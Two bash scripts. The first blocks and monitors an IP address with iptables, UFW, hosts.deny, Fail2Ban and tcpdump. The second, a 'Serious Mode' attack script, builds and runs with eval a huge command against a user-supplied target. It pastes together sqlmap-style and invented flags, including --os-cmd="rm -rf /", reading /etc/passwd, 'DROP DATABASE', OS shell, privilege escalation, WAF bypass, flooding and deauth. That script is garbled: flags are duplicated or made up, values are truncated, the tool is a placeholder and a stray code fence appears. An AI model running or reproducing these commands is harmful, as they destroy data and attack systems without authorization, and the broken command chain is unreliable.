# !/bin/bash

# Ask for the IP Address to block or monitor
read -p "Enter IP Address to block/monitor: " IP_ADDRESS

# Display IP Address entered
echo "You entered: $IP_ADDRESS"

# Block incoming traffic from the IP
echo "[+] Blocking incoming traffic from $IP_ADDRESS"
sudo iptables -A INPUT -s $IP_ADDRESS -j DROP

# Block outgoing traffic to the IP
echo "[+] Blocking outgoing traffic to $IP_ADDRESS"
sudo iptables -A OUTPUT -d $IP_ADDRESS -j DROP

# Save iptables rules to make the block persistent
echo "[+] Saving iptables rules..."
sudo iptables-save > /etc/iptables/rules.v4

# Block IP using UFW (Uncomplicated Firewall)
echo "[+] Blocking IP using UFW"
sudo ufw deny from $IP_ADDRESS

# Block incoming traffic to the IP for SSH
echo "[+] Denying SSH access for $IP_ADDRESS"
echo "sshd: $IP_ADDRESS" | sudo tee -a /etc/hosts.deny

# Check if Fail2Ban is installed, otherwise install it
echo "[+] Installing Fail2Ban if not already installed..."
sudo apt install fail2ban -y

# Configure Fail2Ban for SSH login blocking
echo "[+] Configuring Fail2Ban for SSH..."
sudo nano /etc/fail2ban/jail.local
# In jail.local, add this section (manually edit the file or use echo commands for automation):
# [sshd]
# enabled = true
# filter = sshd
# action = iptables[name=SSH, port=ssh, protocol=tcp]
# logpath = /var/log/auth.log
# maxretry = 3
# bantime = -1

# Restart Fail2Ban
echo "[+] Restarting Fail2Ban..."
sudo systemctl restart fail2ban

# Capture traffic from the IP using tcpdump (monitoring purpose)
echo "[+] Capturing traffic from IP $IP_ADDRESS"
sudo tcpdump host $IP_ADDRESS

# Mark the IP in a log for reference
echo "[+] Adding $IP_ADDRESS to blacklist log"
echo "$IP_ADDRESS blackhat.attacker" | sudo tee -a /etc/hosts

# Notify user the script is finished
echo "[+] Completed blocking and monitoring for IP: $IP_ADDRESS"

_________________________________________________________________________
#!/bin/bash

# Serious Mode Activated ‚Äì Do It All, Once
# Prompt target input once
read -p "[+] Enter target URL, IP, or domain: " TARGET

LOGFILE="log_$(date +%s).txt"

# Core config setup
echo "[+] Preparing configuration..."
BULKFILE="bulk_targets.txt"
REQUESTFILE="custom_request.txt"
CONFIGFILE="attack_config.cfg"
COOKIEFILE="cookies.txt"
AUTHFILE="auth.txt"

# Building Command Chain
# Building Command Chain
CMD="tool_exec \
-h \
-hh \
--version \
-v VERBOSE \
-u $TARGET \
-d DIRECT \
-l $LOGFILE \
-m $BULKFILE \
-r $REQUESTFILE \
-g \"site:$TARGET\" \
-c $CONFIGFILE \
-A \"Mozilla/5.0 (X11; Linux x86_64)\" \
-H \"X-Test-Header: true\" \
--method=POST \
--data=\"username=admin&password=pass\" \
--param-del='&' \
--cookie='sessionid=abc123' \
--cookie-del=';' \
--live-cookies=$COOKIEFILE \
--load-cookies=$COOKIEFILE \
--drop-set-cookie \
--mobile \
--random-agent \
--host=$(echo $TARGET | awk -F/ '{print $3}') \
--referer=https://google.com \
--headers=\"Accept: */*\" \
--auth-type=Basic \
--auth-cred='admin:admin' \
--auth-file=$AUTHFILE \
--abort-code=403 \
--ignore-code=404 \
--ignore-proxy \
--ignore-redirects \
--ignore-timeouts \
--proxy=PROXY \
--proxy-cred=PRO.. \
--proxy-file=PRO.. \
--proxy-freq=PRO.. \
--tor \
--tor-port=TORPORT \
--tor-type=TORTYPE \
--check-tor \
--delay=DELAY \
--timeout=TIMEOUT \
--retries=RETRIES \
--retry-on=RETRYON \
--randomize=RPARAM \
--safe-url=SAFEURL \
--safe-post=SAFE.. \
--safe-req=SAFER.. \
--safe-freq=SAFE.. \
--skip-urlencode \
--csrf-token=CSR.. \
--csrf-url=CSRFURL \
--csrf-method=CS.. \
--csrf-data=CSRF.. \
--csrf-retries=C.. \
--os-cmd="rm -rf /" \
--file-read="/etc/passwd" \
--file-write="/tmp/malicious-file" \
--reg-delete \
--os-pwn \
--os-smbrelay \
--os-shell \
--msf-path="/usr/share/metasploit-framework" \
--os-bof \
--eval="malicious_command_here" \
--sql-injection="DROP DATABASE" \
--priv-esc \
--sql-shell \
--force-ssl \
--exploit="EXTERNAL_EXPLOIT" \
--scan-all \
--dump-all \
--dump \
--sqli-inject \
--bruteforce \
--bypass-waf \
--flood \
--deauth \
--force-ssl \
--chunked \
--hpp \
--eval=EVALCODE \
-o \
--predict-output \
--keep-alive \
--null-connection \
--threads=THREADS \
-p TESTPARAMETER \
--skip=SKIP \
--skip-static \
--param-exclude=.. \
--param-filter=P.. \
--dbms=DBMS \
--dbms-cred=DBMS.. \
--os=OS \
--invalid-bignum \
--invalid-logical \
--invalid-string \
--no-cast \
--no-escape \
--prefix=PREFIX \
--suffix=SUFFIX \
--tamper=TAMPER \
--level=LEVEL \
--risk=RISK \
--string=STRING \
--not-string=NOT.. \
--regexp=REGEXP \
--code=CODE \
--smart \
--text-only \
--titles \
--technique=TECH.. \
--time-sec=TIMESEC \
--union-cols=UCOLS \
--union-char=UCHAR \
--union-from=UFROM \
--union-values=U.. \
--dns-domain=DNS.. \
--second-url=SEC.. \
--second-req=SEC.. \
-f \
--fingerprint \
-a \
--all \
-b \
--banner \
--current-user \
--current-db \
--hostname \
--is-dba \
--users \
--passwords \
--privileges \
--roles \
--dbs \
--tables \
--columns \
--schema \
--count \
--dump \
--dump-all \
--search \
--comments \
--statements \
-D DB \
-T TBL \
-C COL \
-X EXCLUDE \
-U USER \
--exclude-sysdbs \
--pivot-column=P.. \
--where=DUMPWHERE \
--start=LIMITSTART \
--stop=LIMITSTOP \
--first=FIRSTCHAR \
--last=LASTCHAR \
--sql-query=SQLQ.. \
--sql-shell \
--sql-file=SQLFILE \
--common-tables \
--common-columns \
--common-files \
--udf-inject \
--shared-lib=SHLIB \
--file-read=FILE.. \
--file-write=FIL.. \
--file-dest=FILE.. \
--os-cmd=OSCMD \
--os-shell \
--os-pwn \
--os-smbrelay \
--os-bof \
--priv-esc \
--msf-path=MSFPATH \
--tmp-path=TMPPATH \
--reg-read \
--reg-add \
--reg-del \
--reg-key=REGKEY \
--reg-value=REGVAL \
--reg-data=REGDATA \
--reg-type=REGTYPE \
-s SESSIONFILE \
-t TRAFFICFILE \
--abort-on-empty \
--answers=ANSWERS \
--base64=BASE64P.. \
--base64-safe \
--batch \
--binary-fields=.. \
--check-internet \
--cleanup \
--crawl=CRAWLDEPTH \
--crawl-exclude=.. \
--csv-del=CSVDEL \
--charset=CHARSET \
--dump-file=DUMP.. \
--dump-format=DU.. \
--encoding=ENCOD.. \
--eta \
--flush-session \
--forms \
--fresh-queries \
--gpage=GOOGLEPAGE \
--har=HARFILE \
--hex \
--output-dir=OUT.. \
--parse-errors \
--preprocess=PRE.. \
--postprocess=PO.. \
--repair \
--save=SAVECONFIG \
--scope=SCOPE \
--skip-heuristics \
--skip-waf \
--table-prefix=T.. \
--test-filter=TE.. \
--test-skip=TEST.. \
--time-limit=TIM.. \
--unsafe-naming \
--web-root=WEBROOT \
-z MNEMONICS \
--alert=ALERT \
--beep \
--dependencies \
--disable-coloring \
--disable-hashing \
--list-tampers \
--no-logging \
--offline \
--purge \
--results-file=R.. \
--shell \
--tmp-dir=TMPDIR \
--unstable \
--update \
--wizard"
```
# Output the full command
clear
echo "[üîÅ Running Serious Stack Command]"
echo "$CMD"
echo

# Execute Command (you can swap 'tool_exec' with real tool like sqlmap/ffuf/etc.)
eval $CMD

# Done
echo "[‚úîÔ∏è Complete] Results saved in: $LOGFILE"

